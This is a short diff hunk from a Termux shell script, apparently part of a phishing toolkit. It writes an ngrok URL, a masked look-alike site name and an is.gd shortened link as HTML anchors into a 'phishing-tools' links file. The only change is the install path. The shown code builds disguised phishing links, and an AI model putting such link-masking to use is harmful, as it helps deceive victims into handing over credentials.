@@ -102,7 +102,7 @@ if [[ -a $PREFIX/bin/ngrok ]];then
 	<a href=\"$url\">$url</a>
 	<a href=\"$url\">$site$domain</a>
 	<a href=\"$url\">$site$link3</a>
-	<a href=\"$url\">$(echo -e "$special_link" |grep -o https://is.gd/[A-Z.a-z.0-9]\* |sed -n 1p)</a>" > /data/data/com.termux/files/usr/lib/termux-web-tools/files/phishing-tools/phishing_files/links.txt
+	<a href=\"$url\">$(echo -e "$special_link" |grep -o https://is.gd/[A-Z.a-z.0-9]\* |sed -n 1p)</a>" > /data/data/com.termux/files/usr/lib/WIT/files/phishing-tools/phishing_files/links.txt
 	exit
 
 else
